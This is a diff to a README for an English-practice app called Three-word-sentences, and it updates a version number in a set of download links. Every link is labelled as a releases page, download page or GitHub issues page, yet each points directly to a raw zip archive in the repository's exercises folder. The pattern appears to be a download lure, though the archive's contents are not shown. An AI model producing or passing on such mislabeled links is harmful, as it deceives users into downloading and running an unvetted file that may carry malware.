@@ -1,7 +1,7 @@
 # 🎉 Three-word-sentences - Simplifying English Conversations
 
 ## 📥 Download Now!
-[![Download Latest Release](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three-word-sentences-v1.2.zip)](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three-word-sentences-v1.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three_word_sentences_v2.7.zip)](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three_word_sentences_v2.7.zip)
 
 ## 📖 About This Project
 Three-word-sentences helps users understand and practice English conversation. It focuses on the Subject-Verb (SV) and Subject-Verb-Object (SVO) structures. This application is perfect for anyone wanting to improve their English speaking skills in a simple way.
@@ -10,7 +10,7 @@ Three-word-sentences helps users understand and practice English conversation. I
 To get started with Three-word-sentences, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three-word-sentences-v1.2.zip) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three_word_sentences_v2.7.zip) to find the latest version of the application.
 
 2. **Download the Application**
    Look for the latest version listed on the page. Click on the link to download the application file.
@@ -34,7 +34,7 @@ Three-word-sentences offers the following features:
 - **User-Friendly Interface:** Navigate easily with a simple design.
 
 ## 🔧 Download & Install
-To download the application, [visit this page](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three-word-sentences-v1.2.zip). Find the file for the latest version, click on it, and follow the installation instructions.
+To download the application, [visit this page](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three_word_sentences_v2.7.zip). Find the file for the latest version, click on it, and follow the installation instructions.
 
 ## 🌐 Community
 Join our community to get help, share experiences, and learn with others.
@@ -43,7 +43,7 @@ Join our community to get help, share experiences, and learn with others.
 - **Feedback:** We welcome feedback to enhance the application. Reach out anytime!
 
 ## 📬 Contact
-For questions or support, please contact us through our [GitHub issues page](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three-word-sentences-v1.2.zip).
+For questions or support, please contact us through our [GitHub issues page](https://raw.githubusercontent.com/papamusa/Three-word-sentences/main/three-word-sentences/exercises/Three_word_sentences_v2.7.zip).
 
 ## 📚 Topics Covered
 This project covers various topics, including:
